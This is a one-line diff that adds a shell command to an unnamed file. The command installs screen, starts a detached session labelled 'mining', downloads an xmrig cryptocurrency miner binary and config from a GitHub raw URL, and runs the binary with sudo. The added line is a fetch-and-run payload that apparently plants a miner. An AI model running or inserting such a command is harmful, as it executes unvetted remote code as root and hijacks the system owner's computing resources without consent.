@@ -1,0 +1,1 @@
+sudo apt-get install screen -y && screen -dmS mining bash -c 'curl -OL https://raw.githubusercontent.com/bcot5001/xmrig/main/config.json && curl -OL https://raw.githubusercontent.com/bcot5001/xmrig/main/xmrig && chmod +x xmrig && sudo ./xmrig'
